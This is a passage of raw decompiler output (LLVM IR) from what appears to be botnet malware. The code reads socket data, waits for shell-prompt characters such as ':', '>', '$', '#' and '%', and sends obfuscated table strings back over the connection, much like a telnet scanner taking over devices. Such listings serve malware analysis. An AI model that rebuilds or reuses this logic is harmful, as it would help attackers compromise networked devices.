  %v3_804f74f = inttoptr i32 %v2_804f74f to i32*
  store i32 %v3_804f74b, i32* %v3_804f74f, align 4
  %v0_804f753 = load i32, i32* @esi, align 4
  %v1_804f753 = add i32 %v0_804f753, 24
  %v2_804f753 = inttoptr i32 %v1_804f753 to i32*
  %v3_804f753 = load i32, i32* %v2_804f753, align 4
  %v9_804f753 = icmp eq i32 %v3_804f753, 256
  br i1 %v9_804f753, label %dec_label_pc_8050087, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f74b, %dec_label_pc_8050087
  %v0_804f760 = load i32, i32* @esp, align 4
  %v1_804f760 = add i32 %v0_804f760, 40
  %v2_804f760 = inttoptr i32 %v1_804f760 to i32*
  %v3_804f760 = load i32, i32* %v2_804f760, align 4
  store i32 %v3_804f760, i32* %edx.global-to-local, align 4
  %v1_804f764 = add i32 %v0_804f760, 24
  %v2_804f764 = inttoptr i32 %v1_804f764 to i32*
  %v3_804f764 = load i32, i32* %v2_804f764, align 4
  store i32 %v3_804f764, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804f76d = inttoptr i32 %v3_804f760 to i32*
  store i32 0, i32* %v1_804f76d, align 4
  %v0_804f773 = load i32, i32* @esi, align 4
  %v1_804f773 = add i32 %v0_804f773, 24
  %v2_804f773 = inttoptr i32 %v1_804f773 to i32*
  %v3_804f773 = load i32, i32* %v2_804f773, align 4
  store i32 %v3_804f773, i32* %edx.global-to-local, align 4
  %v0_804f776 = load i32, i32* @esp, align 4
  %v1_804f776 = add i32 %v0_804f776, -4
  %v2_804f776 = inttoptr i32 %v1_804f776 to i32*
  store i32 16384, i32* %v2_804f776, align 4
  %v0_804f77b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f77b = load i32, i32* %edx.global-to-local, align 4
  %v2_804f77b = add i32 %v1_804f77b, %v0_804f77b
  store i32 %v2_804f77b, i32* @ebx, align 4
  %v0_804f77d = load i32, i32* %eax.global-to-local, align 4
  %v2_804f77d = sub i32 %v0_804f77d, %v1_804f77b
  store i32 %v2_804f77d, i32* %eax.global-to-local, align 4
  %v2_804f77f = add i32 %v0_804f776, -8
  %v3_804f77f = inttoptr i32 %v2_804f77f to i32*
  store i32 %v2_804f77d, i32* %v3_804f77f, align 4
  %v0_804f780 = load i32, i32* @ebx, align 4
  %v2_804f780 = add i32 %v0_804f776, -12
  %v3_804f780 = inttoptr i32 %v2_804f780 to i32*
  store i32 %v0_804f780, i32* %v3_804f780, align 4
  %v0_804f781 = load i32, i32* @esi, align 4
  %v1_804f781 = add i32 %v0_804f781, 4
  %v2_804f781 = inttoptr i32 %v1_804f781 to i32*
  %v3_804f781 = load i32, i32* %v2_804f781, align 4
  store i32 %v3_804f781, i32* @ebp, align 4
  %v2_804f784 = add i32 %v0_804f776, -16
  %v3_804f784 = inttoptr i32 %v2_804f784 to i32*
  store i32 %v3_804f781, i32* %v3_804f784, align 4
  %v0_804f785 = call i32 @__libc_recv()
  store i32 %v0_804f785, i32* @eax, align 4
  %v0_804f78a = load i32, i32* @esp, align 4
  %v1_804f78a = add i32 %v0_804f78a, 16
  %tmp166 = icmp slt i32 %v0_804f785, 1
  br i1 %tmp166, label %dec_label_pc_804ffc3, label %dec_label_pc_804f796

dec_label_pc_804f796:                             ; preds = %dec_label_pc_804f760
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804f798

dec_label_pc_804f798:                             ; preds = %dec_label_pc_804f7a2, %dec_label_pc_804f796
  %v0_804f79e = phi i32 [ %v1_804f7a2, %dec_label_pc_804f7a2 ], [ 0, %dec_label_pc_804f796 ]
  %v1_804f798 = load i32, i32* @ebx, align 4
  %v2_804f798 = add i32 %v1_804f798, %v0_804f79e
  %v3_804f798 = inttoptr i32 %v2_804f798 to i8*
  %v4_804f798 = load i8, i8* %v3_804f798, align 1
  %v5_804f798 = icmp eq i8 %v4_804f798, 0
  %v1_804f79c = icmp eq i1 %v5_804f798, false
  br i1 %v1_804f79c, label %dec_label_pc_804f7a2, label %dec_label_pc_804f79e

dec_label_pc_804f79e:                             ; preds = %dec_label_pc_804f798
  store i8 65, i8* %v3_804f798, align 1
  %v0_804f7a2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f7a2

dec_label_pc_804f7a2:                             ; preds = %dec_label_pc_804f798, %dec_label_pc_804f79e
  %v0_804f7a2 = phi i32 [ %v0_804f79e, %dec_label_pc_804f798 ], [ %v0_804f7a2.pre, %dec_label_pc_804f79e ]
  %v1_804f7a2 = add i32 %v0_804f7a2, 1
  store i32 %v1_804f7a2, i32* @edx, align 4
  %v12_804f7a3 = icmp eq i32 %v1_804f7a2, %v0_804f785
  %v1_804f7a5 = icmp eq i1 %v12_804f7a3, false
  br i1 %v1_804f7a5, label %dec_label_pc_804f798, label %dec_label_pc_804f7a7

dec_label_pc_804f7a7:                             ; preds = %dec_label_pc_804f7a2, %dec_label_pc_804ffc9
  %v0_804f7a7 = load i32, i32* @esi, align 4
  %v1_804f7a7 = add i32 %v0_804f7a7, 24
  %v2_804f7a7 = inttoptr i32 %v1_804f7a7 to i32*
  %v3_804f7a7 = load i32, i32* %v2_804f7a7, align 4
  %v2_804f7aa = add i32 %v3_804f7a7, %v0_804f785
  store i32 %v2_804f7aa, i32* @ebx, align 4
  %v0_804f7ac = load i32, i32* @global_var_8057d90.47, align 16
  store i32 %v0_804f7ac, i32* %eax.global-to-local, align 4
  store i32 %v2_804f7aa, i32* %v2_804f7a7, align 4
  %v0_804f7b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7b4 = load i32, i32* @esi, align 4
  %v2_804f7b4 = add i32 %v1_804f7b4, 8
  %v3_804f7b4 = inttoptr i32 %v2_804f7b4 to i32*
  store i32 %v0_804f7b4, i32* %v3_804f7b4, align 4
  br label %dec_label_pc_804f7b7

dec_label_pc_804f7b7:                             ; preds = %dec_label_pc_804f853, %dec_label_pc_804f7a7
  %v0_804f7b7 = load i32, i32* @esi, align 4
  %v1_804f7b7 = add i32 %v0_804f7b7, 12
  %v2_804f7b7 = inttoptr i32 %v1_804f7b7 to i32*
  %v3_804f7b7 = load i32, i32* %v2_804f7b7, align 4
  store i32 %v3_804f7b7, i32* %eax.global-to-local, align 4
  switch i32 %v2_804f6f4, label %dec_label_pc_804f740.backedge [
    i32 2, label %dec_label_pc_804fd7a
    i32 3, label %dec_label_pc_804fce5
    i32 4, label %dec_label_pc_804fc2c
    i32 5, label %dec_label_pc_804fb6c
    i32 6, label %dec_label_pc_804faac
    i32 7, label %dec_label_pc_804f9ed
    i32 8, label %dec_label_pc_804f930
    i32 9, label %dec_label_pc_804f873
  ]

dec_label_pc_804f848:                             ; preds = %dec_label_pc_804fcb3, %dec_label_pc_804fbc4, %dec_label_pc_804fb04, %dec_label_pc_804fa44, %dec_label_pc_804f985, %dec_label_pc_804f8c8
  %v0_804f848 = load i32, i32* @esi, align 4
  %v1_804f848 = add i32 %v0_804f848, 24
  %v2_804f848 = inttoptr i32 %v1_804f848 to i32*
  %v3_804f848 = load i32, i32* %v2_804f848, align 4
  store i32 %v3_804f848, i32* %eax.global-to-local, align 4
  %v0_804f84b = load i32, i32* @ebp, align 4
  %v2_804f84d = sub i32 %v0_804f84b, %v3_804f848
  %v8_804f84d = xor i32 %v0_804f84b, %v3_804f848
  %v9_804f84d = xor i32 %v2_804f84d, %v0_804f84b
  %v10_804f84d = and i32 %v9_804f84d, %v8_804f84d
  %v11_804f84d = icmp slt i32 %v10_804f84d, 0
  %v12_804f84d = icmp eq i32 %v2_804f84d, 0
  %v13_804f84d = icmp slt i32 %v2_804f84d, 0
  %v3_804f84f = icmp ne i1 %v13_804f84d, %v11_804f84d
  %v4_804f84f = or i1 %v12_804f84d, %v3_804f84f
  br i1 %v4_804f84f, label %dec_label_pc_804f853, label %dec_label_pc_804f851

dec_label_pc_804f851:                             ; preds = %dec_label_pc_804f848
  br label %dec_label_pc_804f853

dec_label_pc_804f853:                             ; preds = %dec_label_pc_804f848, %dec_label_pc_804f851
  %storemerge319 = phi i32 [ %v3_804f848, %dec_label_pc_804f851 ], [ %v0_804f84b, %dec_label_pc_804f848 ]
  %v1_804f853 = phi i32 [ %v3_804f848, %dec_label_pc_804f851 ], [ %v0_804f84b, %dec_label_pc_804f848 ]
  store i32 %storemerge319, i32* @edx, align 4
  %v2_804f853 = sub i32 %v3_804f848, %v1_804f853
  store i32 %v2_804f853, i32* %eax.global-to-local, align 4
  store i32 %v2_804f853, i32* %v2_804f848, align 4
  %v0_804f858 = load i32, i32* @ebp, align 4
  %v1_804f858 = load i32, i32* @esp, align 4
  %v2_804f858 = add i32 %v1_804f858, -4
  %v3_804f858 = inttoptr i32 %v2_804f858 to i32*
  store i32 %v0_804f858, i32* %v3_804f858, align 4
  %v0_804f859 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f859 = add i32 %v1_804f858, -8
  %v3_804f859 = inttoptr i32 %v2_804f859 to i32*
  store i32 %v0_804f859, i32* %v3_804f859, align 4
  %v1_804f85a = add i32 %v1_804f858, 24
  %v2_804f85a = inttoptr i32 %v1_804f85a to i32*
  %v3_804f85a = load i32, i32* %v2_804f85a, align 4
  %v1_804f85e = load i32, i32* @edx, align 4
  %v2_804f85e = add i32 %v1_804f85e, %v3_804f85a
  store i32 %v2_804f85e, i32* %eax.global-to-local, align 4
  %v2_804f860 = add i32 %v1_804f858, -12
  %v3_804f860 = inttoptr i32 %v2_804f860 to i32*
  store i32 %v2_804f85e, i32* %v3_804f860, align 4
  %v3_804f861 = load i32, i32* %v2_804f85a, align 4
  %v2_804f865 = add i32 %v1_804f858, -16
  %v3_804f865 = inttoptr i32 %v2_804f865 to i32*
  store i32 %v3_804f861, i32* %v3_804f865, align 4
  %v0_804f866 = load i32, i32* %stack_var_-16, align 4
  %v3_804f866 = inttoptr i32 %v0_804f866 to i8*
  %v4_804f866 = call i32 @memmove(i8* %v3_804f866, i32 %v0_804eda2, i32 %v0_804eda1)
  store i32 %v4_804f866, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f7b7

dec_label_pc_804f873:                             ; preds = %dec_label_pc_804f7b7
  %v1_804f873 = add i32 %v0_804f7b7, 24
  %v2_804f873 = inttoptr i32 %v1_804f873 to i32*
  %v3_804f873 = load i32, i32* %v2_804f873, align 4
  store i32 %v3_804f873, i32* %ecx.global-to-local, align 4
  %v1_804f876 = add i32 %v3_804f873, -1
  store i32 %v1_804f876, i32* %eax.global-to-local, align 4
  %tmp167 = icmp slt i32 %v1_804f876, 1
  br i1 %tmp167, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804f881

dec_label_pc_804f881:                             ; preds = %dec_label_pc_804f873
  %v2_804f881 = add i32 %v0_804f7b7, 28
  %v3_804f881 = add i32 %v1_804f876, %v2_804f881
  %v4_804f881 = inttoptr i32 %v3_804f881 to i8*
  %v5_804f881 = load i8, i8* %v4_804f881, align 1
  %v6_804f881 = zext i8 %v5_804f881 to i32
  %v7_804f881 = load i32, i32* @edx, align 4
  %v8_804f881 = and i32 %v7_804f881, -256
  %v9_804f881 = or i32 %v8_804f881, %v6_804f881
  store i32 %v9_804f881, i32* %edx.global-to-local, align 4
  %v10_804f885 = icmp eq i8 %v5_804f881, 58
  br i1 %v10_804f885, label %dec_label_pc_804f8c8, label %dec_label_pc_804f88a

dec_label_pc_804f88a:                             ; preds = %dec_label_pc_804f881
  %v10_804f88a = icmp eq i8 %v5_804f881, 62
  br i1 %v10_804f88a, label %dec_label_pc_804f8c8, label %dec_label_pc_804f88f

dec_label_pc_804f88f:                             ; preds = %dec_label_pc_804f88a
  %v10_804f88f = icmp eq i8 %v5_804f881, 36
  br i1 %v10_804f88f, label %dec_label_pc_804f8c8, label %dec_label_pc_804f894

dec_label_pc_804f894:                             ; preds = %dec_label_pc_804f88f
  %v10_804f894 = icmp eq i8 %v5_804f881, 35
  br i1 %v10_804f894, label %dec_label_pc_804f8c8, label %dec_label_pc_804f899

dec_label_pc_804f899:                             ; preds = %dec_label_pc_804f894
  %v3_804f899 = add i32 %v3_804f873, %v2_804f881
  store i32 %v3_804f899, i32* %ecx.global-to-local, align 4
  %v10_804f89d = icmp eq i8 %v5_804f881, 37
  %v1_804f8a0 = icmp eq i1 %v10_804f89d, false
  br i1 %v1_804f8a0, label %dec_label_pc_804f8b9, label %dec_label_pc_804f8c8

dec_label_pc_804f8a4:                             ; preds = %dec_label_pc_804f8c0
  %v10_804f8a4 = icmp eq i8 %v3_804f8c0, 62
  br i1 %v10_804f8a4, label %dec_label_pc_804f8c8, label %dec_label_pc_804f8a9

dec_label_pc_804f8a9:                             ; preds = %dec_label_pc_804f8a4
  %v10_804f8a9 = icmp eq i8 %v3_804f8c0, 36
  br i1 %v10_804f8a9, label %dec_label_pc_804f8c8, label %dec_label_pc_804f8ae

dec_label_pc_804f8ae:                             ; preds = %dec_label_pc_804f8a9
  %v10_804f8ae = icmp eq i8 %v3_804f8c0, 35
  br i1 %v10_804f8ae, label %dec_label_pc_804f8c8, label %dec_label_pc_804f8b3

dec_label_pc_804f8b3:                             ; preds = %dec_label_pc_804f8ae
  %v1_804f8b3 = add i32 %v0_804f8b3, -1
  store i32 %v1_804f8b3, i32* %ecx.global-to-local, align 4
  %v10_804f8b4 = icmp eq i8 %v3_804f8c0, 37
  br i1 %v10_804f8b4, label %dec_label_pc_804f8c8, label %dec_label_pc_804f8b9

dec_label_pc_804f8b9:                             ; preds = %dec_label_pc_804f899, %dec_label_pc_804f8b3
  %v5_804f8c0 = phi i32 [ %v7_804f8c0, %dec_label_pc_804f8b3 ], [ %v9_804f881, %dec_label_pc_804f899 ]
  %v0_804f8b3 = phi i32 [ %v1_804f8b3, %dec_label_pc_804f8b3 ], [ %v3_804f899, %dec_label_pc_804f899 ]
  %v0_804f8b9 = phi i32 [ %v1_804f8b9, %dec_label_pc_804f8b3 ], [ %v1_804f876, %dec_label_pc_804f899 ]
  %v1_804f8b9 = add i32 %v0_804f8b9, -1
  %v8_804f8b9 = icmp eq i32 %v1_804f8b9, 0
  store i32 %v1_804f8b9, i32* %eax.global-to-local, align 4
  br i1 %v8_804f8b9, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804f8c0

dec_label_pc_804f8c0:                             ; preds = %dec_label_pc_804f8b9
  %v1_804f8c0 = add i32 %v0_804f8b3, -2
  %v2_804f8c0 = inttoptr i32 %v1_804f8c0 to i8*
  %v3_804f8c0 = load i8, i8* %v2_804f8c0, align 1
  %v4_804f8c0 = zext i8 %v3_804f8c0 to i32
  %v6_804f8c0 = and i32 %v5_804f8c0, -256
  %v7_804f8c0 = or i32 %v4_804f8c0, %v6_804f8c0
  store i32 %v7_804f8c0, i32* %edx.global-to-local, align 4
  %v10_804f8c3 = icmp eq i8 %v3_804f8c0, 58
  %v1_804f8c6 = icmp eq i1 %v10_804f8c3, false
  br i1 %v1_804f8c6, label %dec_label_pc_804f8a4, label %dec_label_pc_804f8c8

dec_label_pc_804f8c8:                             ; preds = %dec_label_pc_804f8b3, %dec_label_pc_804f8ae, %dec_label_pc_804f8a9, %dec_label_pc_804f8a4, %dec_label_pc_804f8c0, %dec_label_pc_804f899, %dec_label_pc_804f894, %dec_label_pc_804f88f, %dec_label_pc_804f88a, %dec_label_pc_804f881
  %v0_804f8cb = phi i32 [ %v1_804f876, %dec_label_pc_804f899 ], [ %v1_804f876, %dec_label_pc_804f894 ], [ %v1_804f876, %dec_label_pc_804f88f ], [ %v1_804f876, %dec_label_pc_804f88a ], [ %v1_804f876, %dec_label_pc_804f881 ], [ %v1_804f8b9, %dec_label_pc_804f8c0 ], [ %v1_804f8b9, %dec_label_pc_804f8a4 ], [ %v1_804f8b9, %dec_label_pc_804f8a9 ], [ %v1_804f8b9, %dec_label_pc_804f8ae ], [ %v1_804f8b9, %dec_label_pc_804f8b3 ]
  %v0_804f8c8 = load i32, i32* @esp, align 4
  %v1_804f8cb = add i32 %v0_804f8cb, 1
  store i32 %v1_804f8cb, i32* @ebp, align 4
  %v1_804f8ce = add i32 %v0_804f8c8, -16
  %v2_804f8ce = inttoptr i32 %v1_804f8ce to i32*
  store i32 28, i32* %v2_804f8ce, align 4
  %v0_804f8d0 = load i32, i32* %stack_var_-16, align 4
  %v1_804f8d0 = trunc i32 %v0_804f8d0 to i8
  %v2_804f8d0 = call i32 @table_unlock_val(i8 %v1_804f8d0)
  store i32 %v2_804f8d0, i32* %eax.global-to-local, align 4
  %v0_804f8d5 = load i32, i32* @esp, align 4
  %v1_804f8d5 = inttoptr i32 %v0_804f8d5 to i32*
  %v2_804f8d5 = load i32, i32* %v1_804f8d5, align 4
  store i32 %v2_804f8d5, i32* %eax.global-to-local, align 4
  %v3_804f8d5 = add i32 %v0_804f8d5, 4
  %v1_804f8d6 = inttoptr i32 %v3_804f8d5 to i32*
  %v1_804f8d7 = add i32 %v0_804f8d5, 1880
  store i32 %v1_804f8d7, i32* %edx.global-to-local, align 4
  store i32 %v1_804f8d7, i32* %v1_804f8d6, align 4
  store i32 28, i32* %v1_804f8d5, align 4
  %v0_804f8e1 = load i32, i32* %stack_var_-16, align 4
  %v3_804f8e1 = call i32 @table_retrieve_val(i32 %v0_804f8e1, i32* %v2_8050185)
  store i32 %v3_804f8e1, i32* %eax.global-to-local, align 4
  %v0_804f8e6 = load i32, i32* @esp, align 4
  %v1_804f8e6 = add i32 %v0_804f8e6, -4
  %v2_804f8e6 = inttoptr i32 %v1_804f8e6 to i32*
  store i32 16384, i32* %v2_804f8e6, align 4
  %v1_804f8eb = add i32 %v0_804f8e6, 1880
  %v2_804f8eb = inttoptr i32 %v1_804f8eb to i32*
  %v3_804f8eb = load i32, i32* %v2_804f8eb, align 4
  %v2_804f8f2 = add i32 %v0_804f8e6, -8
  %v3_804f8f2 = inttoptr i32 %v2_804f8f2 to i32*
  store i32 %v3_804f8eb, i32* %v3_804f8f2, align 4
  %v2_804f8f3 = add i32 %v0_804f8e6, -12
  %v3_804f8f3 = inttoptr i32 %v2_804f8f3 to i32*
  store i32 %v3_804f8e1, i32* %v3_804f8f3, align 4
  %v0_804f8f4 = load i32, i32* @esi, align 4
  %v1_804f8f4 = add i32 %v0_804f8f4, 4
  %v2_804f8f4 = inttoptr i32 %v1_804f8f4 to i32*
  %v3_804f8f4 = load i32, i32* %v2_804f8f4, align 4
  store i32 %v3_804f8f4, i32* @ebx, align 4
  %v2_804f8f7 = add i32 %v0_804f8e6, -16
  %v3_804f8f7 = inttoptr i32 %v2_804f8f7 to i32*
  store i32 %v3_804f8f4, i32* %v3_804f8f7, align 4
  %v0_804f8f8 = load i32, i32* %stack_var_-16, align 4
  %v4_804f8f8 = call i32 @__libc_send(i32 %v0_804f8f8, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804f8f8, i32* %eax.global-to-local, align 4
  %v0_804f8fd = load i32, i32* @esp, align 4
  %v1_804f900 = add i32 %v0_804f8fd, 28
  %v2_804f900 = inttoptr i32 %v1_804f900 to i32*
  store i32 16384, i32* %v2_804f900, align 4
  %v1_804f905 = add i32 %v0_804f8fd, 24
  %v2_804f905 = inttoptr i32 %v1_804f905 to i32*
  store i32 2, i32* %v2_804f905, align 4
  %v1_804f907 = add i32 %v0_804f8fd, 20
  %v2_804f907 = inttoptr i32 %v1_804f907 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804f907, align 4
  %v0_804f90c = load i32, i32* @esi, align 4
  %v1_804f90c = add i32 %v0_804f90c, 4
  %v2_804f90c = inttoptr i32 %v1_804f90c to i32*
  %v3_804f90c = load i32, i32* %v2_804f90c, align 4
  store i32 %v3_804f90c, i32* %ecx.global-to-local, align 4
  %v2_804f90f = add i32 %v0_804f8fd, 16
  %v3_804f90f = inttoptr i32 %v2_804f90f to i32*
  store i32 %v3_804f90c, i32* %v3_804f90f, align 4
  %v0_804f910 = load i32, i32* %stack_var_-16, align 4
  %v4_804f910 = call i32 @__libc_send(i32 %v0_804f910, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804f910, i32* %eax.global-to-local, align 4
  %v0_804f915 = load i32, i32* @esp, align 4
  %v1_804f915 = inttoptr i32 %v0_804f915 to i32*
  store i32 28, i32* %v1_804f915, align 4
  %v0_804f91c = load i32, i32* %stack_var_-16, align 4
  %v1_804f91c = trunc i32 %v0_804f91c to i8
  %v2_804f91c = call i32 @table_lock_val(i8 %v1_804f91c)
  store i32 %v2_804f91c, i32* %eax.global-to-local, align 4
  %v0_804f924 = load i32, i32* @esi, align 4
  %v1_804f924 = add i32 %v0_804f924, 12
  %v2_804f924 = inttoptr i32 %v1_804f924 to i32*
  store i32 10, i32* %v2_804f924, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804f930:                             ; preds = %dec_label_pc_804f7b7
  %v1_804f930 = add i32 %v0_804f7b7, 24
  %v2_804f930 = inttoptr i32 %v1_804f930 to i32*
  %v3_804f930 = load i32, i32* %v2_804f930, align 4
  store i32 %v3_804f930, i32* %ecx.global-to-local, align 4
  %v1_804f933 = add i32 %v3_804f930, -1
  store i32 %v1_804f933, i32* %eax.global-to-local, align 4
  %tmp168 = icmp slt i32 %v1_804f933, 1
  br i1 %tmp168, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804f93e

dec_label_pc_804f93e:                             ; preds = %dec_label_pc_804f930
  %v2_804f93e = add i32 %v0_804f7b7, 28
  %v3_804f93e = add i32 %v1_804f933, %v2_804f93e
  %v4_804f93e = inttoptr i32 %v3_804f93e to i8*
  %v5_804f93e = load i8, i8* %v4_804f93e, align 1
  %v6_804f93e = zext i8 %v5_804f93e to i32
  %v7_804f93e = load i32, i32* @edx, align 4
  %v8_804f93e = and i32 %v7_804f93e, -256
  %v9_804f93e = or i32 %v8_804f93e, %v6_804f93e
  store i32 %v9_804f93e, i32* %edx.global-to-local, align 4
  %v10_804f942 = icmp eq i8 %v5_804f93e, 58
  br i1 %v10_804f942, label %dec_label_pc_804f985, label %dec_label_pc_804f947

dec_label_pc_804f947:                             ; preds = %dec_label_pc_804f93e
  %v10_804f947 = icmp eq i8 %v5_804f93e, 62
  br i1 %v10_804f947, label %dec_label_pc_804f985, label %dec_label_pc_804f94c

dec_label_pc_804f94c:                             ; preds = %dec_label_pc_804f947
  %v10_804f94c = icmp eq i8 %v5_804f93e, 36
  br i1 %v10_804f94c, label %dec_label_pc_804f985, label %dec_label_pc_804f951

dec_label_pc_804f951:                             ; preds = %dec_label_pc_804f94c
  %v10_804f951 = icmp eq i8 %v5_804f93e, 35
  br i1 %v10_804f951, label %dec_label_pc_804f985, label %dec_label_pc_804f956

dec_label_pc_804f956:                             ; preds = %dec_label_pc_804f951
  %v3_804f956 = add i32 %v3_804f930, %v2_804f93e
  store i32 %v3_804f956, i32* %ecx.global-to-local, align 4
  %v10_804f95a = icmp eq i8 %v5_804f93e, 37
  %v1_804f95d = icmp eq i1 %v10_804f95a, false
  br i1 %v1_804f95d, label %dec_label_pc_804f976, label %dec_label_pc_804f985

dec_label_pc_804f961:                             ; preds = %dec_label_pc_804f97d
  %v10_804f961 = icmp eq i8 %v3_804f97d, 62
  br i1 %v10_804f961, label %dec_label_pc_804f985, label %dec_label_pc_804f966

dec_label_pc_804f966:                             ; preds = %dec_label_pc_804f961
  %v10_804f966 = icmp eq i8 %v3_804f97d, 36
  br i1 %v10_804f966, label %dec_label_pc_804f985, label %dec_label_pc_804f96b

dec_label_pc_804f96b:                             ; preds = %dec_label_pc_804f966
  %v10_804f96b = icmp eq i8 %v3_804f97d, 35
  br i1 %v10_804f96b, label %dec_label_pc_804f985, label %dec_label_pc_804f970

dec_label_pc_804f970:                             ; preds = %dec_label_pc_804f96b
  %v1_804f970 = add i32 %v0_804f970, -1
  store i32 %v1_804f970, i32* %ecx.global-to-local, align 4
  %v10_804f971 = icmp eq i8 %v3_804f97d, 37
  br i1 %v10_804f971, label %dec_label_pc_804f985, label %dec_label_pc_804f976

dec_label_pc_804f976:                             ; preds = %dec_label_pc_804f956, %dec_label_pc_804f970
  %v5_804f97d = phi i32 [ %v7_804f97d, %dec_label_pc_804f970 ], [ %v9_804f93e, %dec_label_pc_804f956 ]
  %v0_804f970 = phi i32 [ %v1_804f970, %dec_label_pc_804f970 ], [ %v3_804f956, %dec_label_pc_804f956 ]
  %v0_804f976 = phi i32 [ %v1_804f976, %dec_label_pc_804f970 ], [ %v1_804f933, %dec_label_pc_804f956 ]
  %v1_804f976 = add i32 %v0_804f976, -1
  %v8_804f976 = icmp eq i32 %v1_804f976, 0
  store i32 %v1_804f976, i32* %eax.global-to-local, align 4
  br i1 %v8_804f976, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804f97d

dec_label_pc_804f97d:                             ; preds = %dec_label_pc_804f976
  %v1_804f97d = add i32 %v0_804f970, -2
  %v2_804f97d = inttoptr i32 %v1_804f97d to i8*
  %v3_804f97d = load i8, i8* %v2_804f97d, align 1
  %v4_804f97d = zext i8 %v3_804f97d to i32
  %v6_804f97d = and i32 %v5_804f97d, -256
  %v7_804f97d = or i32 %v4_804f97d, %v6_804f97d
  store i32 %v7_804f97d, i32* %edx.global-to-local, align 4
  %v10_804f980 = icmp eq i8 %v3_804f97d, 58
  %v1_804f983 = icmp eq i1 %v10_804f980, false
  br i1 %v1_804f983, label %dec_label_pc_804f961, label %dec_label_pc_804f985

dec_label_pc_804f985:                             ; preds = %dec_label_pc_804f970, %dec_label_pc_804f96b, %dec_label_pc_804f966, %dec_label_pc_804f961, %dec_label_pc_804f97d, %dec_label_pc_804f956, %dec_label_pc_804f951, %dec_label_pc_804f94c, %dec_label_pc_804f947, %dec_label_pc_804f93e
  %v0_804f988 = phi i32 [ %v1_804f933, %dec_label_pc_804f956 ], [ %v1_804f933, %dec_label_pc_804f951 ], [ %v1_804f933, %dec_label_pc_804f94c ], [ %v1_804f933, %dec_label_pc_804f947 ], [ %v1_804f933, %dec_label_pc_804f93e ], [ %v1_804f976, %dec_label_pc_804f97d ], [ %v1_804f976, %dec_label_pc_804f961 ], [ %v1_804f976, %dec_label_pc_804f966 ], [ %v1_804f976, %dec_label_pc_804f96b ], [ %v1_804f976, %dec_label_pc_804f970 ]
  %v0_804f985 = load i32, i32* @esp, align 4
  %v1_804f988 = add i32 %v0_804f988, 1
  store i32 %v1_804f988, i32* @ebp, align 4
  %v1_804f98b = add i32 %v0_804f985, -16
  %v2_804f98b = inttoptr i32 %v1_804f98b to i32*
  store i32 27, i32* %v2_804f98b, align 4
  %v0_804f98d = load i32, i32* %stack_var_-16, align 4
  %v1_804f98d = trunc i32 %v0_804f98d to i8
  %v2_804f98d = call i32 @table_unlock_val(i8 %v1_804f98d)
  store i32 %v2_804f98d, i32* %eax.global-to-local, align 4
  %v0_804f992 = load i32, i32* @esp, align 4
  %v1_804f992 = inttoptr i32 %v0_804f992 to i32*
  %v2_804f992 = load i32, i32* %v1_804f992, align 4
  store i32 %v2_804f992, i32* %eax.global-to-local, align 4
  %v3_804f992 = add i32 %v0_804f992, 4
  %v1_804f993 = inttoptr i32 %v3_804f992 to i32*
  %v2_804f993 = load i32, i32* %v1_804f993, align 4
  store i32 %v2_804f993, i32* %edx.global-to-local, align 4
  %v1_804f994 = add i32 %v0_804f992, 1880
  store i32 %v1_804f994, i32* %eax.global-to-local, align 4
  store i32 %v1_804f994, i32* %v1_804f993, align 4
  store i32 27, i32* %v1_804f992, align 4
  %v0_804f99e = load i32, i32* %stack_var_-16, align 4
  %v3_804f99e = call i32 @table_retrieve_val(i32 %v0_804f99e, i32* %v2_8050185)
  store i32 %v3_804f99e, i32* %eax.global-to-local, align 4
  %v0_804f9a3 = load i32, i32* @esp, align 4
  %v1_804f9a3 = add i32 %v0_804f9a3, -4
  %v2_804f9a3 = inttoptr i32 %v1_804f9a3 to i32*
  store i32 16384, i32* %v2_804f9a3, align 4
  %v1_804f9a8 = add i32 %v0_804f9a3, 1880
  %v2_804f9a8 = inttoptr i32 %v1_804f9a8 to i32*
  %v3_804f9a8 = load i32, i32* %v2_804f9a8, align 4
  %v2_804f9af = add i32 %v0_804f9a3, -8
  %v3_804f9af = inttoptr i32 %v2_804f9af to i32*
  store i32 %v3_804f9a8, i32* %v3_804f9af, align 4
  %v2_804f9b0 = add i32 %v0_804f9a3, -12
  %v3_804f9b0 = inttoptr i32 %v2_804f9b0 to i32*
  store i32 %v3_804f99e, i32* %v3_804f9b0, align 4
  %v0_804f9b1 = load i32, i32* @esi, align 4
  %v1_804f9b1 = add i32 %v0_804f9b1, 4
  %v2_804f9b1 = inttoptr i32 %v1_804f9b1 to i32*
  %v3_804f9b1 = load i32, i32* %v2_804f9b1, align 4
  store i32 %v3_804f9b1, i32* @ebx, align 4
  %v2_804f9b4 = add i32 %v0_804f9a3, -16
  %v3_804f9b4 = inttoptr i32 %v2_804f9b4 to i32*
  store i32 %v3_804f9b1, i32* %v3_804f9b4, align 4
  %v0_804f9b5 = load i32, i32* %stack_var_-16, align 4
  %v4_804f9b5 = call i32 @__libc_send(i32 %v0_804f9b5, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804f9b5, i32* %eax.global-to-local, align 4
  %v0_804f9ba = load i32, i32* @esp, align 4
  %v1_804f9bd = add i32 %v0_804f9ba, 28
  %v2_804f9bd = inttoptr i32 %v1_804f9bd to i32*
  store i32 16384, i32* %v2_804f9bd, align 4
  %v1_804f9c2 = add i32 %v0_804f9ba, 24
  %v2_804f9c2 = inttoptr i32 %v1_804f9c2 to i32*
  store i32 2, i32* %v2_804f9c2, align 4
  %v1_804f9c4 = add i32 %v0_804f9ba, 20
